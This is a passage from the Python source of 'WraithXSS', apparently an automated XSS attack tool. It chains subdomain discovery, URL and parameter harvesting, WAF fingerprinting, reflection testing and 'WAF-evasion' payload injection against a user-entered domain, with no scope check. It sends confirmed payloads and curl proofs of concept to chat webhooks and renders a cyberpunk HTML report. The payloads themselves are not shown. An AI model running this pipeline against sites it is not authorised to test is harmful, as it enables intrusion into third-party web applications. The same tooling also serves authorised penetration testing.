                    self.urls.update(new_urls)
            log(f"Phase 4 Complete: {len(new_urls)} smart candidates injected into core buffer.", "green", advance=60)
            return new_urls

        new_urls = self.run_specter_module("Shadow Mining", "Smart parameter extraction", ps_task)
        self.preview_results("Spider Vectors", new_urls)
        self.print_status("PARAMSPIDER", f"Injected {len(new_urls)} smart injection candidates")
        self.prompt_and_save(set(new_urls), "paramspider.txt", "spider parameters")

    def run_arjun(self):
        """Run Arjun for hidden parameter discovery with Neural Logic."""
        def arjun_task(log, progress, tid):
            log("Identifying heuristic brute-force vectors in web-root...", "yellow", advance=5)
            log("Fuzzing for undocumented parameters and shadow API keys...", "cyan", advance=10)
            hosts = list(self.live_hosts)[:3] if self.live_hosts else [f"http://{self.domain}"]
            arjun_urls = []
            self._ensure_output_dir()
            for i, host in enumerate(hosts):
                log(f"Assaulting service node ({i+1}/{len(hosts)}): {host}", "magenta", advance=15)
                self.run_tool(f"arjun -u {host} -oT {self.output_dir}/arjun.txt", f"Heuristic Discovery")
                ar_file = self.output_dir / "arjun.txt"
                if ar_file.exists():
                    with open(ar_file) as f:
                        arjun_urls.extend([l.strip() for l in f if '?' in l])
            self.urls.update(arjun_urls)
            log(f"Phase 5 Complete: {len(arjun_urls)} hidden vectors discovered.", "green", advance=10)
            return arjun_urls

        arjun_urls = self.run_specter_module("Parameter Fuzzing", "Heuristic brute-force discovery", arjun_task)
        self.print_status("ARJUN", f"Phase complete: {len(arjun_urls)} hidden vectors secured")
        self.prompt_and_save(set(arjun_urls), "arjun_urls.txt", "hidden parameters")


    def run_analysis(self, automated_log=None):
        """Internal Reflection & WAF Analysis with Neural Logic."""
        def analysis_task(log, progress, tid):
            log(f"Analyzing candidates for heuristic reflection patterns...", "yellow", advance=10)
            log("Fingerprinting WAF signatures and rate-limit thresholds...", "cyan", advance=15)
            log("Identifying execution contexts (HTML, attribute, JS, CSS)...", "magenta", advance=15)
            
            if not self.urls:
                log("No vectors found. Skipping context mapping.", "red")
                return []

            tester = WAFDetector()
            target = list(self.live_hosts)[0] if self.live_hosts else f"https://{self.domain}"
            self.waf_info = tester.detect(target)
            if self.waf_info.detected:
                log(f"WAF DETECTED: {self.waf_info.waf_type.value} [SHIELD ACTIVE]", "bold red")
            
            ref_tester = ReflectionTester()
            url_list = list(self.urls)[:200]
            for i, url in enumerate(url_list):
                try:
                    params = parse_qs(urlparse(url).query)
                    for p in params.keys():
                        res = ref_tester.test_reflection(url, p)
                        if res.reflects: self.reflections.append(res)
                except: continue
                
                # Feedback for automated mode
                if i % 5 == 0:
                    log(f"Analyzing reflection vector [{i}/{len(url_list)}]: {url[:40]}...", "dim cyan")

                # Advance progress periodically
                if progress and i % 20 == 0: progress.advance(tid, 2)
            
            log(f"Phase 6 Complete: {len(self.reflections)} prone targets synchronized.", "green", advance=10)
            return self.reflections

        self.run_specter_module("Neural Analysis", "Reflection & WAF Intelligence", analysis_task, automated_log=automated_log)
        self.print_status("Neural Analyzer", f"Confirmed {len(self.reflections)} valid targets")

    def run_exploitation(self, automated_log=None, breach_callback=None):
        """Internal Active XSS Injection with Neural Logic."""
        if not self.reflections:
            console.print("[bold yellow]⚠ SYSTEM OVERRIDE: No target-reflection patterns available.[/bold yellow]")
            return

        def exploit_task(log, progress, tid):
            log(f"Infiltrating {len(self.reflections)} prone reflection patterns...", "red", advance=10)
            log("Deploying polymorphic context-aware payloads with WAF-evasion...", "cyan", advance=15)
            log("Triggering neural handshakes and parsing response JS integrity...", "magenta", advance=15)
            
            tester = XSSInjectionTester() if 'XSSInjectionTester' in globals() else WAFDetector()
            for i, r in enumerate(self.reflections):
                log(f"Assaulting data-vector: {r.parameter} [{i+1}/{len(self.reflections)}]", "magenta", advance=(60 / len(self.reflections)))
                results = tester.test_xss(r.url, r.parameter, r.context)
                for res in results:
                    exploit_data = {'url': res.url, 'param': res.parameter, 'payload': res.payload, 'evidence': res.evidence, 'severity': res.severity, 'poc': res.poc_curl}
                    self.exploits.append(exploit_data)
                    self.send_webhook(f"🔥 **VULNERABILITY CONFIRMED** 🔥\nTarget: {self.domain}\nParam: `{res.parameter}`\nPayload: `{res.payload}`\nPOC: `{res.poc_curl}`")
                    log(f"!! CRITICAL BREACH: Payload active on {res.parameter} !!", "bold red")
                    if breach_callback:
                        breach_callback(res)
                
                # Safe progress update
                if progress and i % 5 == 0: progress.advance(tid, (60 / len(self.reflections)) * 5)

            return self.exploits

        self.run_specter_module("Exploitation Assault", "Executing context-aware payloads", exploit_task, automated_log=automated_log)
        
        if self.exploits:
            # ELITE VULNERABILITY MATRIX
            table = Table(
                box=None, 
                expand=True, 
                header_style="bold red", 
                border_style="bold red",
                padding=(0, 2)
            )
            table.add_column("VULN_ID", style="bold white", justify="center", width=10)
            table.add_column("TARGET_VECTOR", style="bold yellow", justify="left")
            table.add_column("PRECISION_STATE", style="bold green", justify="center", width=18)
            table.add_column("EXPLOIT_POC", style="dim cyan", justify="left")
            
            for i, e in enumerate(self.exploits[:12], 1):
                table.add_row(f"BREACH_{i:02}", e['param'], "CRITICAL", "[bold green]VERIFIED ✓[/bold green]", f"{e['poc'][:60]}...")
            
            width = 100
            console.print(f"\n[bold red]╭{"─" * (width-2)}╮[/bold red]")
            console.print(f"[bold red]│[/bold red] [bold white underline]{" ☢ WRAITH XSS: VULNERABILITY BREACH MATRIX ☢ ".center(width-6)}[/] [bold red]│[/bold red]")
            console.print(f"[bold red]├{"─" * (width-2)}┤[/bold red]")
            console.print(table)
            console.print(f"[bold red]╰{"─" * (width-2)}╯[/bold red]\n")
        else: 
            self.print_status("Exploiter Engine", "No confirmed execution. Target remains resistant.")

    def show_menu(self):
        """Interactive Main Menu with high-tech aesthetic."""
        while True:
            console.print("\n[bold cyan]⚡ SYSTEM OVERRIDE - NEURAL COMMAND INTERFACE ⚡[/bold cyan]")
            menu_table = Table(box=None, expand=True)
            menu_table.add_column("CID", style="bold magenta", justify="center", width=5)
            menu_table.add_column("TOOL COMPONENT", style="bold white")
            menu_table.add_column("THREAT LEVEL", style="bold red", justify="center")
            
            menu_table.add_row("01", "🔥 [bold green]Full Automated Assault[/bold green] (Neural Scan)", "CRITICAL")
            menu_table.add_row("02", "🔍 Subdomain Discovery (Subfinder)", "LOW")
            menu_table.add_row("03", "📡 Live Host Probing (HTTPX)", "LOW")
            menu_table.add_row("04", "📦 URL Harvesting (GAU)", "MED")
            menu_table.add_row("05", "🕷️ Parameter Mining (ParamSpider)", "MED")
            menu_table.add_row("06", "🎯 Hidden Param Fuzzing (Arjun)", "HIGH")
            menu_table.add_row("07", "🔬 Reflection & WAF Analysis", "HIGH")
            menu_table.add_row("08", "☠️ Active XSS Exploitation", "SEVERE")
            menu_table.add_row("09", "📊 Generate Final Report", "SAFE")
            menu_table.add_row("10", "📡 [bold cyan]Configure Alert Webhooks[/]", "-")
            menu_table.add_row("11", "💾 [bold green]Synchronize Neural Profile[/]", "-")
            menu_table.add_row("12", "📂 [bold yellow]Restore Neural Profile[/]", "-")
            menu_table.add_row("13", "📡 [bold cyan]Reconfigure Target Domain[/]", "NEW")
            menu_table.add_row("00", "[bold red]TERMINATE CONNECTION[/bold red]", "-")
            
            console.print(Panel(menu_table, border_style="bold cyan", title="[bold white]MAIN COMMAND MODULE[/bold white]", subtitle="[dim white]V2.0 PRO | SPECTER CORE[/dim white]"))
            
            choice = Prompt.ask("[bold cyan]Select Protocol[/bold cyan]", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "00"], default="1")

            # Support both single digit and double digit input
            clean_choice = choice.lstrip('0') if choice != '00' and choice != '0' else '0'
            if not clean_choice: clean_choice = '0' # Case for '00' or '0'
            
            if clean_choice == "1": self.run()
            elif clean_choice == "2": self.run_subfinder()
            elif clean_choice == "3": self.run_httpx()
            elif clean_choice == "4": self.run_gau()
            elif clean_choice == "5": self.run_paramspider()
            elif clean_choice == "6": self.run_arjun()
            elif clean_choice == "7": self.run_analysis()
            elif clean_choice == "8": self.run_exploitation()
            elif clean_choice == "9": self.generate_report()
            elif clean_choice == "10":
                self.webhooks["discord"] = Prompt.ask("[bold blue]Enter Discord Webhook URL[/]", default=self.webhooks["discord"])
                self.webhooks["slack"] = Prompt.ask("[bold green]Enter Slack Webhook URL[/]", default=self.webhooks["slack"])
                console.print("[bold green]✔ Webhooks updated.[/]")
            elif clean_choice == "11": self.save_profile()
            elif clean_choice == "12": self.load_profile()
            elif clean_choice == "13": self.reconfigure_target()
            elif clean_choice == "0": 
                console.print("[bold yellow]Terminating Neural Handshake... Goodbye![/bold yellow]")
                sys.exit(0)


    def generate_report(self):
        if not self.exploits and not self.reflections:
            console.print("[yellow]No data to report. Run some tools first![/yellow]")
            return
        
        # High-End Cyberpunk HTML Report
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>WraithXSS Intelligence Report | {self.domain}</title>
            <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono&display=swap" rel="stylesheet">
            <style>
                :root {{
                    --neon-blue: #00d9ff;
                    --neon-red: #ff0055;
                    --neon-green: #00ff88;
                    --bg-dark: #0a0a0f;
                    --card-bg: rgba(20, 20, 30, 0.8);
                }}
                body {{
                    background-color: var(--bg-dark);
                    color: #e0e0e0;
                    font-family: 'Roboto Mono', monospace;
                    margin: 0;
                    padding: 0;
                    background-image: 
                        linear-gradient(rgba(0, 217, 255, 0.05) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(0, 217, 255, 0.05) 1px, transparent 1px);
                    background-size: 30px 30px;
                }}
                .container {{ max-width: 1200px; margin: 0 auto; padding: 40px 20px; }}
                h1, h2, h3 {{ font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 2px; }}
                header {{
                    text-align: center;
                    border-bottom: 2px solid var(--neon-blue);
                    padding-bottom: 20px;
                    margin-bottom: 40px;
                    box-shadow: 0 10px 20px -10px var(--neon-blue);
                }}
                .glitch {{
                    font-size: 3rem;
                    color: var(--neon-blue);
                    text-shadow: 2px 2px var(--neon-red), -2px -2px var(--neon-green);
                }}
                .stats-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-bottom: 40px;
                }}
                .stat-card {{
                    background: var(--card-bg);
                    padding: 20px;
                    border: 1px solid var(--neon-blue);
                    border-radius: 10px;
                    text-align: center;
                    transition: all 0.3s ease;
                }}
                .stat-card:hover {{ transform: translateY(-5px); box-shadow: 0 0 20px var(--neon-blue); }}
                .stat-value {{ font-size: 2rem; color: var(--neon-blue); font-weight: bold; }}
                .vulnerability-card {{
                    background: rgba(255, 0, 85, 0.05);
                    border-left: 5px solid var(--neon-red);
                    margin-bottom: 20px;
                    padding: 20px;
                    border-radius: 0 10px 10px 0;
                    backdrop-filter: blur(10px);
                }}
                code {{
                    background: #000;
                    padding: 4px 8px;
                    border-radius: 4px;
                    color: var(--neon-green);
                    word-break: break-all;
                }}
                .severity {{
                    display: inline-block;
                    padding: 5px 15px;
                    background: var(--neon-red);
                    color: white;
                    border-radius: 20px;
                    font-size: 0.8rem;
                    font-weight: bold;
                }}
                footer {{ text-align: center; margin-top: 60px; font-size: 0.8rem; color: #666; }}
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <h1 class="glitch">WRAITH_INTEL_SYSTEM</h1>
                    <p>Intelligence Harvesting Final Report: {self.domain}</p>
                </header>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-label">LIVE_HOSTS</div>
                        <div class="stat-value">{len(self.live_hosts)}</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-label">TOTAL_URLS</div>
                        <div class="stat-value">{len(self.urls)}</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-label">REFLECTIONS</div>
                        <div class="stat-value">{len(self.reflections)}</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-label">EXPLOITS</div>
                        <div class="stat-value" style="color: var(--neon-red)">{len(self.exploits)}</div>
                    </div>
                </div>

                <h2>☣ VULNERABILITY_MATRIX</h2>
                {"".join([f'''
                <div class="vulnerability-card">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <h3>PARAM: {e['param']}</h3>
                        <span class="severity">CRITICAL</span>
                    </div>
                    <p><strong>URL_VECTOR:</strong> <code>{e['url']}</code></p>
                    <p><strong>PAYLOAD_STRING:</strong> <code>{e['payload']}</code></p>
                    <p><strong>AUTO_POC (CURL):</strong> <code>{e['poc']}</code></p>
                    <p><strong>EVIDENCE_DUMP:</strong> <small>{html.escape(e['evidence'])}</small></p>
                </div>
                ''' for e in self.exploits])}

                <footer>
                    WRAITH XSS v{VERSION} | Generated at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                </footer>
            </div>
        </body>
        </html>
        """
        self._ensure_output_dir()
        with open(self.report_file, 'w') as f: f.write(html_content)
        console.print(f"\n[bold green]✅ INTERACTIVE INTELLIGENCE REPORT SECURED at: {self.report_file}[/bold green]")

    def save_consolidated_results(self):
        """Consolidate all findings into one file and ask for save confirmation."""
        if not any([self.subdomains, self.live_hosts, self.urls, self.exploits]):
            console.print("[yellow]No data to save. Run some tools first![/yellow]")
            return

        console.print(f"\n[bold cyan]💾 CONSOLIDATION ENGINE[/bold cyan]")
        
        # Preview collected data before saving
        if self.subdomains:
            self.preview_results("Subdomains Preview", self.subdomains)
        if self.live_hosts:
            self.preview_results("Live Hosts Preview", self.live_hosts)
        if self.urls:
            self.preview_results("URLs Preview", self.urls)
        if self.exploits:
            # Create a summary list for exploits to display nicely in the preview
            exploit_preview = [f"{e.get('param', '?')} -> {e.get('payload', '')[:30]}..." for e in self.exploits]
            self.preview_results("Exploits Preview", exploit_preview)

        confirm = Prompt.ask("Do you want to save all collected results into a single file?", choices=["y", "n"], default="y")
        
        if confirm.lower() == 'y':
            final_file = self.output_dir / "final_results.txt"
            self._ensure_output_dir()
            with open(final_file, 'w') as f:
                f.write(f"WraithXSS Final Report for {self.domain}\n")
                f.write(f"Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*50 + "\n\n")

                if self.subdomains:
                    f.write(f"--- SUBDOMAINS ({len(self.subdomains)}) ---\n")
                    f.write('\n'.join(sorted(self.subdomains)) + "\n\n")

                if self.live_hosts:
                    f.write(f"--- LIVE HOSTS ({len(self.live_hosts)}) ---\n")
                    f.write('\n'.join(sorted(self.live_hosts)) + "\n\n")

                if self.urls:
                    f.write(f"--- DISCOVERED URLS ({len(self.urls)}) ---\n")
                    f.write('\n'.join(sorted(self.urls)) + "\n\n")

                if self.exploits:
                    f.write(f"--- VULNERABILITIES FOUND ({len(self.exploits)}) ---\n")
                    for e in self.exploits:
                        f.write(f"Param: {e['param']} | Severity: {e['severity'].upper()}\n")
                        f.write(f"URL: {e['url']}\n")
                        f.write(f"Payload: {e['payload']}\n")
                        f.write(f"Evidence: {e['evidence']}\n")
                        f.write("-" * 30 + "\n")
            
            self.print_status("CONSOLIDATOR", f"All data merged and secured", "final_results.txt")
            
            # Also ask for HTML report
            confirm_html = Prompt.ask("Do you also want to generate the Interactive HTML Report?", choices=["y", "n"], default="y")
            if confirm_html.lower() == 'y':
                self.generate_report()
        else:
            console.print("[bold yellow]⚠ SAVE CANCELED: Results will not be stored on disk.[/bold yellow]")

    def _run_cmd_live(self, cmd: List[str], log_callback, signal_callback=None, collection=None) -> List[str]:
        """Run command and stream output live to the dashboard."""
        results = []
        try:
            if signal_callback:
                signal_callback(f"Deploying: {' '.join(cmd[:3])}...")
            
            # Use stderr=subprocess.STDOUT to avoid deadlocks when stderr buffer fills
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            
            # Stream stdout
            for line in process.stdout:
                line = line.strip()
                if not line: continue
                
                results.append(line)
                if collection is not None:
                    collection.add(line)
                
                # Update dashboard log with the live data
                if log_callback:
                    log_callback(f"Captured: {line[:50]}...", "dim cyan")
            
            process.wait(timeout=10) # Short wait for cleanup
            return results
        except Exception as e:
            if log_callback:
                log_callback(f"Execution Error: {str(e)}", "red")
            return results

    def _run_cmd(self, cmd: List[str]) -> str:
        """Internal helper to run command and return stdout (Legacy/Fallback)."""
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return result.stdout
        except: return ""

    def calculate_neural_threat(self) -> str:
        """Calculate target threat level based on reconnaissance data."""
        score = 0
        score += len(self.reflections) * 5
        score += len(self.exploits) * 15
        if self.waf_info and getattr(self.waf_info, 'detected', False): score -= 20
        
        if score > 50: return "[bold blink red]CRITICAL[/]"
        if score > 20: return "[bold orange3]HIGH[/]"
        if score > 5: return "[bold yellow]MODERATE[/]"
        return "[bold green]LOW[/]"

    def run(self):
        """Perform a full automated 'Elite Specter' assault with a stable vertical UI."""
        # Persistent Dashboard Setup
        layout = Layout()
        layout.split_column(
            Layout(name="stats", size=11),
            Layout(name="log", ratio=1),
            Layout(name="progress", size=3)
        )
        
        progress = Progress(
            SpinnerColumn("dots8", style="bold magenta"),
            TextColumn("[bold cyan]◬ {task.description}[/]"),
            BarColumn(bar_width=None, style="dim white", complete_style="bold cyan"),
            TextColumn("[bold magenta]{task.percentage:>3.0f}%[/]"),
            console=console
        )
        task_id = progress.add_task("INITIATING CORE...", total=100)
        
        mission_progress = 0
        current_phase = "IDLE"

        def get_progress_bar(percent):
            # Elite Neural Pulse Animation
            pulse_chars = ["▱", "▰", "█", "▰"]
            pulse_idx = int(time.time() * 4) % len(pulse_chars)
            pulse = pulse_chars[pulse_idx]
            
            width = 18
            filled = int(width * percent / 100)
            bar = "█" * filled + pulse + "▱" * (width - filled - 1)
            color = "bold green" if percent > 90 else "bold yellow" if percent > 50 else "bold cyan"
            return f"[{color}]{bar[:width]}[/] [white]{percent}%[/]"

        def create_stats_table():
            stats_table = Table(box=None, expand=True)
            stats_table.add_column("METRIC", style="bold cyan", width=20)
            stats_table.add_column("VALUE", style="bold white")
            
            stats_table.add_row("MISSION STATUS", f"[bold blink cyan]0x{random.randint(100,999):X}_{current_phase}[/]")
            stats_table.add_row("NEURAL SYNC", get_progress_bar(mission_progress))
            stats_table.add_row("UPTIME PULSE", str(datetime.now() - self.start_time).split('.')[0])
            stats_table.add_row("DOMAINS MAPPED", f"[bold yellow]{len(self.subdomains)}[/]")
            stats_table.add_row("LIVE ASSETS", f"[bold green]{len(self.live_hosts)}[/]")
            stats_table.add_row("CANDIDATE VECTORS", f"[bold blue]{len(self.urls)}[/]")
            stats_table.add_row("REFLECTION POINTS", f"[bold magenta]{len(self.reflections)}[/]")
            stats_table.add_row("EXPLOITS CONFIRMED", f"[bold red]{len(self.exploits)}[/]")
            stats_table.add_row("NEURAL THREAT", self.calculate_neural_threat())
            return stats_table

        def update_stats():
            stats_panel = Panel(create_stats_table(), title="[bold white]⚛ CORE INTEL ⚛[/]", border_style="bold blue")
            layout["stats"].update(stats_panel)
        
        # Helper to create a fresh log table snapshot
        def create_log_table(rows):
            t = Table(box=None, expand=True, show_header=False)
            t.add_column("STREAM", style="dim white")
            for r in rows:
                t.add_row(*r)
            return t

        log_rows = []

        def stream_log(msg, color="white", **kwargs):
            # Safe log appending
            timestamp = datetime.now().strftime('%H:%M:%S')
            row = (f"[{color}][{timestamp}] ⟫ {msg}[/]",)
            log_rows.append(row)
            if len(log_rows) > 12: log_rows.pop(0)
            
            # Update the layout with a completely new Table instance
            layout["log"].update(Panel(create_log_table(log_rows), title="[bold white]⚛ NEURAL SIGNAL STREAM ⚛[/]", border_style="bold cyan"))
            update_stats()

        def stream_signal(msg):
            stream_log(f"SIGNAL: {msg}", "bold yellow")

        def stream_breach(res):
            stream_log(f"!! CRITICAL BREACH: {res.parameter} !!", "bold red")

        # Initial Updates
        update_stats()
        layout["log"].update(Panel(create_log_table(log_rows), title="[bold white]⚛ NEURAL SIGNAL STREAM ⚛[/]", border_style="bold cyan"))
        layout["progress"].update(Panel(progress, border_style="bold magenta"))
        
        # Disabled screen=True to avoid initialization hangs in some terminals
        with Live(layout, refresh_per_second=4, screen=False):
            stream_log(f"Establishing neural handshake with {self.domain}...", "cyan")
            time.sleep(1)
            
            # PHASE 1: SUBDOMAINS
            current_phase = "RECON_1"
            mission_progress = 5
            progress.update(task_id, description="MAPPING DNS TOPOLOGY", completed=mission_progress)
            stream_log("Launching Subdomain Discovery...", "yellow")
            self._run_cmd_live(["subfinder", "-d", self.domain, "-silent"], stream_log, stream_signal, self.subdomains)
            mission_progress = 15
            progress.update(task_id, completed=mission_progress)

            # PHASE 2: HOST_PROBE
            current_phase = "RECON_2"
            progress.update(task_id, description="VALIDATING ASSETS", completed=mission_progress)
            stream_log("Probing active service nodes...", "yellow")
            if not self.subdomains: self.subdomains.add(self.domain)
            self._ensure_output_dir()
            with open(self.subdomains_file, 'w') as f: f.write('\n'.join(self.subdomains))
            self._run_cmd_live(["httpx", "-l", str(self.subdomains_file), "-silent"], stream_log, stream_signal, self.live_hosts)
            mission_progress = 30
            progress.update(task_id, completed=mission_progress)

            # PHASE 3: HARVESTING
            current_phase = "MINING_1"
            progress.update(task_id, description="HARVESTING VECTORS", completed=mission_progress)
            stream_log("Mining URL archives (GAU)...", "yellow")
            self._run_cmd_live(["gau", "--subs", self.domain], stream_log, stream_signal, self.urls)
            mission_progress = 45
            progress.update(task_id, completed=mission_progress)

            # PHASE 4: DOM_MINING
            current_phase = "MINING_2"
            progress.update(task_id, description="DOM FRAGMENTATION", completed=mission_progress)
            stream_log("Mining internal DOM patterns (ParamSpider)...", "yellow")
            self._run_cmd(["paramspider", "-d", self.domain, "-o", str(self.output_dir / "ps_auto.txt")])
            ps_file = self.output_dir / "ps_auto.txt"
            if ps_file.exists():
                with open(ps_file) as f:
                    for l in f:
                        if '?' in l:
                            self.urls.add(l.strip())
            mission_progress = 60
            progress.update(task_id, completed=mission_progress)

            if self.fuzz:
                current_phase = "FUZZING"
                progress.update(task_id, description="HEURISTIC DISCOVERY", completed=mission_progress)
                stream_log("Fuzzing hidden parameters (Arjun)...", "yellow")
                t_url = list(self.live_hosts)[0] if self.live_hosts else f"http://{self.domain}"
                self._run_cmd(["arjun", "-u", t_url, "-oT", str(self.output_dir / "ar_auto.txt")])
                ar_file = self.output_dir / "ar_auto.txt"
                if ar_file.exists():
                    with open(ar_file) as f:
                        for l in f:
                            if '?' in l:
                                self.urls.add(l.strip())
            mission_progress = 75
            progress.update(task_id, completed=mission_progress)

            # PHASE 5: ANALYSIS
            current_phase = "ANALYSIS"
            progress.update(task_id, description="NEURAL ANALYZING", completed=mission_progress)
            stream_log("Fingerprinting WAF & context reflections...", "magenta")
            # PASS PROGRESS explicitely if required by internal methods, or handle duplications
            self.run_analysis(automated_log=stream_log) 
            mission_progress = 90
            progress.update(task_id, completed=mission_progress)

            # PHASE 6: EXPLOITATION
            current_phase = "EXPLOIT"
            progress.update(task_id, description="EXECUTING ASSAULT", completed=mission_progress)
            stream_log("Deploying context-aware payloads...", "red")
            self.run_exploitation(automated_log=stream_log, breach_callback=stream_breach)
            mission_progress = 100
            progress.update(task_id, completed=mission_progress)
            current_phase = "COMPLETE"

            stream_log("OPERATION SPECTER: Successfully Terminated.", "bold green")
            time.sleep(2)
            
            # --- VULNERABILITY SUMMARY REPORT ---
            console.clear()
            console.print(Panel(f"[bold white]CORE MISSION REPORT: {self.domain}[/]", border_style="bold blue"))
            
            if self.exploits:
                console.print(f"\n[bold red blink]⚠ CRITICAL VULNERABILITIES DETECTED: {len(self.exploits)} ⚠[/]\n")
                
                vh_table = Table(box=box.HEAVY, border_style="red")
                vh_table.add_column("ID", style="white")
                vh_table.add_column("TYPE", style="bold yellow")
                vh_table.add_column("PAYLOAD", style="cyan")
                
                for idx, exploit in enumerate(self.exploits):
                    vh_table.add_row(f"{idx+1:02}", "Reflected XSS", exploit.get('payload', 'N/A')[:40]+"...")
                
                console.print(vh_table)
                console.print(f"\n[bold white]Logs Saved To:[/] [underline cyan]{self.output_dir}[/]")
            else:
                console.print(f"\n[bold green]✔ SYSTEM ANALYSIS COMPLETE. NO DIRECT EXPLOIT VECTORS FOUND.[/]")
                console.print(f"[dim]Note: This does not guarantee invulnerability. Manual review recommended.[/]")
            
            console.print("\n[bold dim]Press Enter to return to main console...[/]")
            input()

        self.save_profile()
        self.save_consolidated_results()

def main():
    parser = argparse.ArgumentParser(description="WraithXSS v2.0")
    parser.add_argument("-d", "--domain", help="Target domain (required)")
    parser.add_argument("-o", "--output", help="Output directory")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads for external tools")
    parser.add_argument("--timeout", type=int, default=30, help="HTTP timeout")
    parser.add_argument("--no-deep", action="store_true", help="Disable deep scan")
    parser.add_argument("--no-fuzz", action="store_true", help="Disable parameter fuzzing")
    args = parser.parse_args()
    
    # Check for domain
    if not args.domain:
        # Style if no domain provided initially
        console.print("\n[bold orange3]⚠️ Domain is required for scanning.[/bold orange3]")
        domain = Prompt.ask("[bold cyan]Enter target domain (e.g., example.com)[/bold cyan]")
        if not domain: sys.exit(0)
        args.domain = domain

    # Defaults
    args.deep = not args.no_deep
    args.fuzz = not args.no_fuzz
    
    hunter = XSSParamHunter(args)
    
    # --- SMART ENTRY PROTOCOL (AUTO-DETECTION) ---
    if hunter.profile_file.exists():
        console.print(f"\n[bold green]⚛ SPECTER INTEL: Detected existing neural profile for {args.domain}[/]")
        res = Prompt.ask("Do you want to restore the previous session state?", choices=["y", "n"], default="y")
        if res.lower() == 'y':
            hunter.load_profile()
    
    # Always boot visually for the Ultimate Experience
    hunter.boot_animation()
    hunter.print_banner()
    hunter.show_menu()

if __name__ == "__main__":
    main()
